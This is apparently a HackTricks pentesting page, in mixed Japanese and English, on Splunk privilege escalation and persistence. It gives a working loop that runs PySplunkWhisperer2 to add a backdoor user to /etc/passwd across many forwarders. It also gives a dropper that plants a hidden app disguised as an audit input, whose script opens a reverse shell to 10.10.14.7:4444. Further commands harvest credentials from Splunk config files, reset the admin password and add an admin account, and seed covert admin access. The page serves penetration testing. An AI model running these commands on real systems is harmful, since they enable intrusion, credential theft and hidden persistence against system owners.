# Splunk LPE and Persistence

**internally** または **externally** にマシンを **enumerating** している際に **Splunk running**（通常、Web UI は **8000**、management API は **8089**）を発見した場合、有効な credentials は、app installation、scripted inputs、management actions を通じて **code execution** に利用できることがよくあります。<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Splunk が **root** として動作している場合、これによって即座に **privilege escalation** が可能になることがよくあります。<sup>[[1]](#references)</sup>

generic な remote attack surface、enumeration、または app-upload RCE path のみが必要な場合は、以下を確認してください。

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

すでに **root** で、Splunk service が localhost のみに listen していない場合は、**Splunk password hashes** の steal、**encrypted secrets** の recover、または **malicious app** の push によって、ローカルまたは複数の forwarder にわたって persistence を維持することもできます。<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Interesting Local Files

Splunk または Splunk Universal Forwarder が動作している host にアクセスした場合、通常、以下の paths が最も興味深いものです。<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
重要なartifact:

- **`$SPLUNK_HOME/etc/passwd`**: ローカルのSplunkユーザーとpassword hash。<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: 複数の`.conf`ファイルに保存されたsecretのencryptにSplunkが使用するkey。<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: 初期admin bootstrapファイル。gold imageやprovisioningのミスで有用。`etc/passwd`がすでに存在する場合は無視される。<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: scripted inputが有効化されることの多い場所。<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** または **`$SPLUNK_HOME/etc/apps/`**: persistent appを隠したり、すでにdistributionされている内容を確認したりするのに適した場所。<sup>[[11]](#references)</sup>

## Splunk Universal Forwarder Agent Exploit Summary

詳細については[https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)を確認してください。ここではsummaryのみを示します。<sup>[[1]](#references)</sup>

**Exploit overview:**
Splunk Universal Forwarder（UF）を標的とするexploitにより、**agent password**を持つ攻撃者は、agentが稼働しているシステム上で任意のcodeを実行でき、環境の大部分がcompromiseされる可能性があります。<sup>[[1]](#references)</sup>

**Why it works:**

- UF management serviceは通常、**TCP 8089**で公開されています。<sup>[[6]](#references)</sup>
- 攻撃者はAPIにauthenticateし、forwarderに**malicious app bundle**をinstallするよう指示できます。<sup>[[1]](#references)[[5]](#references)</sup>
- 同じprimitiveを、localでは**LPE**に、remoteでは**RCE**に利用できます。<sup>[[5]](#references)</sup>
- **SplunkWhisperer2**などのpublic toolingはapp bundleを自動的に作成し、Linux target向けにpayloadを適応できます。<sup>[[5]](#references)</sup>

**Common ways to recover the password:**

- documentation、script、share、deployment automation内のcleartext credentials。<sup>[[1]](#references)</sup>
- `$SPLUNK_HOME/etc/passwd`内のpassword hashを取得し、offline crackingを行う。<sup>[[1]](#references)[[7]](#references)</sup>
- `user-seed.conf`などのgold imageやprovisioningの残骸。<sup>[[1]](#references)[[9]](#references)</sup>

**Impact:**

- compromiseされた各host上でのSYSTEM/root-level code execution。<sup>[[1]](#references)</sup>
- persistent app、backdoor、またはransomwareのdeployment。<sup>[[1]](#references)</sup>
- dataがforwardされる前にtelemetryをdisableまたはtamperすること。<sup>[[1]](#references)</sup>

**Example command for exploitation:**

元のreportでは、複数のforwarderにpayloadを送信するために、以下のloopを使用しています。<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**利用可能な公開exploit:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Scripted Inputs または Malicious Apps によるPersistence

`root`/`splunk` として **filesystem write access** がある場合、または apps のインストールに対する認証済みアクセスがある場合、非常に信頼性の高いPersistenceメカニズムは、**scripted input** を含む **custom app** を配置することです。<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Splunk 自身のドキュメントでは、scripted inputs は app directory 配下に配置し、`inputs.conf` から有効化することが想定されています。<sup>[[10]](#references)</sup>

一般的な構成:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
最小限の `inputs.conf`:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Quick Linux dropper（文書化された app layout を使用）:<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notes:

- 同じ手法は、`/opt/splunkforwarder/etc/apps/` を使用する **Universal Forwarder** でも機能します。<sup>[[2]](#references)[[10]](#references)</sup>
- Attackers は、明らかに悪意のある app を作成する代わりに、正規の add-on を変更して紛れ込むことがよくあります。<sup>[[2]](#references)</sup>
- **deployment server** では、悪意のある app を `deployment-apps/` 内に配置すると、forwarder が polling して更新された app を download し、適用のために restart することが多いため、**fleet-wide persistence** につながります。<sup>[[11]](#references)[[12]](#references)</sup>

## Credential Theft and Admin Takeover

Splunk の local files を読み取れる場合、通常は **Splunk admin access** の回復と、**encrypted service credentials** の回復という2つの有力な目標があります。<sup>[[8]](#references)</sup>

### Password hashes and local users

Splunk は local authentication data を `etc/passwd` に保存します。deployment によっては、この file を cracking することで、web UI と management API に対する有効な credentials を回復できます。<sup>[[1]](#references)[[7]](#references)</sup>

すでに有効な **admin** credentials を持っており、Splunk が **native** authentication backend を使用している場合、CLI 自体を persistence に利用できます。<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` と暗号化された値

Splunk は、複数の設定ファイルに保存される機密値を保護するために `etc/auth/splunk.secret` を使用します。**secret** と関連する **`.conf` ファイル** の両方を盗める場合、以下の値を復元または再利用できることがあります:<sup>[[8]](#references)</sup>

- `pass4SymmKey` などの forwarder/indexer shared secrets
- `sslPassword` などの TLS private-key passwords
- `bindDNPassword` などの LDAP bind credentials

これにより、Splunk admin password 自体を crack できない場合でも、**lateral movement** が可能になります。<sup>[[8]](#references)</sup>

### `user-seed.conf` の悪用

`user-seed.conf` は初回起動時、または `etc/passwd` が存在しない場合にのみ読み込まれます。そのため、稼働中の box ではあまり有用ではありませんが、以下の環境では非常に興味深い対象になります:<sup>[[9]](#references)</sup>

- compromised installation templates
- container images
- unattended provisioning workflows
- Splunk が自動的に再初期化される appliances

このような場合、`splunk hash-passwd` で生成した `HASHED_PASSWORD` を仕込むことで、再デプロイ後に admin access を静かに取り戻せます。<sup>[[9]](#references)</sup>

## Splunk Queries の悪用

詳細については [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) を確認してください。<sup>[[3]](#references)[[4]](#references)</sup>

最近の有用な technique の1つは、脆弱な Splunk Enterprise versions において **user-supplied XSLT** を悪用し、low-privileged authenticated account を `splunk` user としての **OS command execution** に変えることです。<sup>[[3]](#references)[[4]](#references)</sup>

High-level flow:<sup>[[3]](#references)[[4]](#references)</sup>

1. Splunk に Authenticate する。
2. preview/upload functionality を介して malicious **XSL** file を Upload する。
3. Splunk に、**dispatch** directory にある upload 済み stylesheet を使用して search results を render させる。
4. XSLT payload を使用して file を write するか、Splunk の search pipeline を介して execution を trigger する（たとえば `runshellscript` などの internal functionality に到達する）。

重要な offensive takeaway は、この path が **app upload を必要としない post-auth RCE** であることです。Linux では通常、**`splunk`** account として access を得ます。この user は application tree を所有していることが多く、secrets を read でき、shell を失っても survive する persistent apps を plant できるため、依然として valuable です。<sup>[[3]](#references)[[4]](#references)</sup>

Exploitation 中に使用される representative path は以下のとおりです:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Splunk が過剰な権限で実行されている場合、または `splunk` ユーザーが危険なスクリプト、書き込み可能な service unit、あるいは不適切な `sudo` ルールにアクセスできる場合、これは容易な **LPE** chain になります。

## References

- [1] [Splunk Forwarders の悪用による RCE と Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [TraitorWare に注意: Persistence のための Splunk の利用](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214 Analysis: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [デフォルト値の変更](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [複数のサーバーに secure password をデプロイする](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [scripted input の設定](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [deployment apps の作成](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [deployment updates の仕組み](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [CLI を使用した users の設定](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
